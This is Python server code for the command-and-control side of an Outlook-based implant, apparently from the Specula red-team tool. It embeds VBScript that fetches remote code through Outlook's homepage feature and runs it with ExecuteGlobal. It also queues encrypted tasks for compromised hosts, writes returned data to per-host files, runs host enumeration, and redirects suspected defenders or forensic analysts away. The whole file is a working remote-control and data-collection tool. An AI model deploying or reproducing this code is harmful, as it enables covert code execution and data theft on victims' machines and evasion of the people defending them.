import copy
import jinja2
from urllib.parse import unquote, urlparse
from lib.core.specagents import AgentClass
from lib.core.utility import encrypt_code, decrypt_code, TaskClass
import tornado
import random
from datetime import datetime
from lib.core.setup import gconfig
DLName = "DownloadCacheLogic"
LOADSUPPORT = """
Sub {} ()
		Set server_manager = window.external.OutlookApplication.CreateObject("MSXML2.ServerXMLHTTP")
		vr = Left(window.external.OutlookApplication.version,4)
		server_manager.open "GET", "{}", False
		server_manager.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
		server_manager.send
		rp = server_manager.ResponseText
        ExecuteGlobal rp
End Sub
"""

#encrypt 1||0 Left(msg 1)
#refreshtime len 4 int Mid (msg, 2, 4)
#code Mid(msg 6)
r = random.Random()
class AgentComHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header('Server', gconfig.SERVER_HEADER)

    def get(self):
        user_agent = self.request.headers.get("User-Agent")
        url = self.request.full_url()
        uri = self.request.uri
        remote_ip = self.request.remote_ip
        handled = False
        
        self.application.helpers.speclog("*** [INBOUND GET] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        if self.application.helpers.inblocklist(remote_ip):
            self.application.helpers.speclog('*** [blocklisted IP] ({}): Valid GET endpoint request from blocklisted ip'.format(remote_ip))
            self.render('blocklist.html',
                        CLSID=gconfig.CLSID)
            return
        elif 'Outlook' in user_agent:
            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + "): Valid Useragent")
            agent: AgentClass # type anotation
            if self.application.helpers.pastenddate(): # Handler for past end date
                for agent in self.application.helpers.a_list:
                    if urlparse(agent.url).path == uri: 
                        self.set_header("Cache-Control", "no-store")
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Unique Agent URL triggered")
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Updating Lastseen, Useragent and callback count")
                        agent.update_callback()
                        agent.lastcheckin = datetime.now().strftime(self.application.helpers.timeformat)
                        agent.useragent = user_agent
                        handled = True
                        self.application.helpers.speclog("*** [ENDDATE] (" + remote_ip + "): Tasking remove homepage hook")
                        mod = self.application.helpers.get_module('execute/host/remove_homepage')
                        task = TaskClass('execute/host/remove_homepage',
                                        self.application.helpers.renderModule(mod, agent),
                                        mod.entry,
                                        {},
                                        True)
                        agent.add_task(task)
                        self.render('base.html',
                                REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                LOADSUPPORT=LOADSUPPORT.format(DLName, agent.supporturl),
                                DLSUPPORT=DLName,
                                CLSID=gconfig.CLSID)
                        return
            for agent in self.application.helpers.a_list:
                #Doing urlparse to compare only the url and not hostname
                if urlparse(agent.codeurl).path == uri: #Code url - server encrypted vbscode
                    self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Requesting Encrypted Code")
                    self.set_header("Cache-Control", "no-store")
                    agent.update_callback()
                    agent.lastcheckin = datetime.now().strftime(self.application.helpers.timeformat)
                    if gconfig.PUSHOVER_API_TOKEN != None:
                            if agent.pushnextcallback:
                                self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Push on next callback enabled - sending push to the sweet operator")
                                self.application.helpers.sendPush(agent.remoteip, agent.hostname,
                                                      "Agent called back and you wanted to be notified")
                                agent.pushnextcallback = False # Turning off push on next callback
                    else:
                        if agent.pushnextcallback:
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Push on next callback enabled - However no pushover key specified")
                            agent.pushnextcallback = False # Turning off push on next callback
                    if len(agent.tasks) > 0:
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Found queued task to execute - " + agent.tasks[0].name)
                        code = agent.tasks[0].code
                        if agent.tasks[0].encrypt:
                            self.write("1")
                            code = encrypt_code(code, agent.encryptionkey)
                        else:
                            self.write("0")
                        self.write(self.application.helpers.addJitter(agent.jitter, agent.refreshtime).zfill(4))
                        self.write(code)
                        handled = True
                    else:
                        self.write("2") # is this the best option?
                        self.write(self.application.helpers.addJitter(agent.jitter, agent.refreshtime).zfill(4))
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): No queued task to execute")
                        handled = True
                    break
                if urlparse(agent.supporturl).path == uri:
                    with open('helperFunctions/supportFuncs.txt') as fp:
                        data = fp.read()
                        env = jinja2.Environment(autoescape=False)
                        doc = env.from_string(data)
                        self.write(doc.render({
                            "CODEURL": agent.codeurl,
                            "REFRESH_TIME": agent.refreshtime,
                            "ENCRYPTIONKEY_LOCATION": gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION,
                            "ENCRYPTIONKEY_VALUENAME": gconfig.ENCRYPTIONKEY_VALUENAME
                        })
                        )
                        handled = True
                        break
                if urlparse(agent.url).path == uri: #Unique url per agent
                    self.set_header("Cache-Control", "no-store")
                    self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Unique Agent URL triggered")
                    self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Updating Lastseen, Useragent and callback count")
                    agent.update_callback()
                    agent.lastcheckin = datetime.now().strftime(self.application.helpers.timeformat)
                    agent.useragent = user_agent
                    if agent.remoteip == "10.10.10.10": ## This is the task for prestaged clients to update db info
                        if agent.prestaged != True: # we flip this after the the first callin cycle
                            if gconfig.PUSH_UNEXPECTEDCALLBACK == "True":
                                self.application.helpers.sendPush(remote_ip, "None", "[!] Unexpected Prestaged callback")
                            handled = True
                            self.render('base.html',
                                    OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                    LOADSUPPORT="",
                                    DLSUPPORT="",
                                    CLSID=gconfig.CLSID)
                            break
                        else:
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Prestaged agents first checkin, executing special task to update database")
                            mod = self.application.helpers.get_module('enumerate/host/list_basic')
                            task = TaskClass('enumerate/host/list_basic',
                                             self.application.helpers.renderModule(mod, agent),
                                             mod.entry,
                                             {},
                                             True)
                            agent.add_task(task)
                            # intentional fall through to base.html render
                            # set firstseen to now
                            agent.firstseen = datetime.now().strftime(gconfig.TIME_FORMAT)
                    elif agent.remoteip != remote_ip:
                        if gconfig.PUSH_NEWIP == "True":
                            self.application.helpers.sendPush(agent.remoteip, agent.hostname,
                                                      "New ip on existing agent, updating to {}".format(remote_ip))
                        agent.remoteip = remote_ip
                        # intentional fall through
                    self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Agent Connected")
                    handled = True
                    self.render('base.html',
                            REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                            OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                            LOADSUPPORT=LOADSUPPORT.format(DLName, agent.supporturl),
                            DLSUPPORT=DLName,
                            CLSID=gconfig.CLSID)
                    break

            if not handled:
                if gconfig.PUSH_UNKNOWNCONNECTION == "True":
                    self.application.helpers.sendPush(remote_ip, "UNKNOWN/Blue team",
                                                  "Call in to our valid handler url, but not in database - Blue team on to you?")
                self.render('base.html',
                            OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                            LOADSUPPORT="",
                            DLSUPPORT="",
                            CLSID=gconfig.CLSID)
            self.application.helpers.save_agents_to_file()
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): Inbound connection with wrong UserAgent - Useragent: " + user_agent)
            if gconfig.PUSH_UNEXPECTEDCALLBACK == "True":
                self.application.helpers.sendPush(remote_ip, "UNKNOWN/Blue team", "Connection with unexpected useragent: " + user_agent)
            if gconfig.REDIRECT_FALSE_AGENTS.lower() == "template":
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): REDIRECTING to template **Evil laugh**")
                self.render('redirect_template.html')
            else:
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): REDIRECTING to " + gconfig.REDIRECT_FALSE_AGENTS + " **Evil laugh**")
                self.redirect(gconfig.REDIRECT_FALSE_AGENTS)

    def post(self):
        user_agent = self.request.headers.get("User-Agent")
        url = self.request.full_url()
        uri = self.request.uri
        remote_ip = self.request.remote_ip
        self.application.helpers.speclog("*** [INBOUND POST] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        #TODO right now we return a 404, is that the intent
        if self.application.helpers.inblocklist(remote_ip) or self.application.helpers.pastenddate():
            self.application.helpers.speclog('*** [blocklisted IP or ENDDATE] ({}): Valid POST endpoint request from blocklisted ip'.format(remote_ip))
            self.set_status(404)
        elif 'Outlook' in user_agent:
            try:
                returndata = tornado.escape.json_decode(self.request.body)
                for agent in self.application.helpers.a_list:
                    if urlparse(agent.url).path == uri:
                        t = None
                        if agent.tasks != []:
                            #call return data handler of task
                            t = agent.tasks.pop(0)
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Data returned from agent")
                        returndata_decoded = decrypt_code(returndata,agent.encryptionkey)
                        if t is None or t.printlog:
                            with open("agent_data/" + agent.hostname + ".txt", "a+") as agent_log:
                                agent_log.write(datetime.now().strftime(self.application.helpers.timeformat) + " -- " + t.name + "\n")
                                agent_log.write(returndata_decoded + "\n\n")
                            self.application.helpers.speclog(
                                "*** [AGENTCOM] (" + remote_ip + "): RETURN DATA - " + returndata)
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Data written to agent_data/" + agent.hostname + ".txt")
                        if t is not None:
                            mod = tmp = None
                            if t.name in self.application.helpers.modlist:
                                mod, tmp = self.application.helpers.modlist[t.name]
                            elif t.name in self.application.helpers.hiddenmods:
                                mod, tmp = self.application.helpers.hiddenmods[t.name]
                            if mod is not None:
                                module = mod.Spec(tmp, self.application.helpers)
                                try:
                                    module.rethandler(agent, t.options, returndata_decoded)
                                    if module.entry == 'list_basic':
                                        agent.remoteip = self.request.remote_ip
                                        agent.useragent = user_agent
                                        if agent.prestaged:
                                            agent.prestaged = False
                                            if gconfig.PUSH_PRESTAGE == "True":
                                                self.application.helpers.sendPush(remote_ip, agent.hostname, "Prestaged agent first checkin")
                                except Exception as msg:
                                    self.application.helpers.speclog("*** [AGENTCOM] ({}) ({}) error calling rethandler for task {}"
                                                                     "\t{}".format(remote_ip, agent.hostname, t.name, msg))
                                    pass
                                finally:
                                    del module
                                    del t
                            self.application.helpers.save_agents_to_file() #UPDATE DB FILE
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Removed executed task from queue")
                        break
                    else:
                        self.set_status(404)
            except ValueError:
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - POST data sent was invalid - Might be DFIR")
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - Invalid Useragent on POST - Something phishy is going on!")
            self.set_status(404)